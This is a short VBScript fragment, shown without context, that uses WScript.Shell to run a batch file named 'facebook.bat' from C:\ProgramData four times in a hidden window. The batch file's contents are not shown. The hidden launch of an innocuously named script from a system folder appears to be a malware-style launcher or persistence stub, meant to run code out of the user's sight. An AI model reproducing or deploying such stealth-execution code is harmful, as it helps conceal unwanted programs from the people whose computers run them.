 For i = 3 to 0 step -1
	Set WshShell = CreateObject("WScript.Shell") 
	WshShell.Run chr(34) & "C:\ProgramData\facebook.bat" & Chr(34), 0
	Set WshShell = Nothing
 Next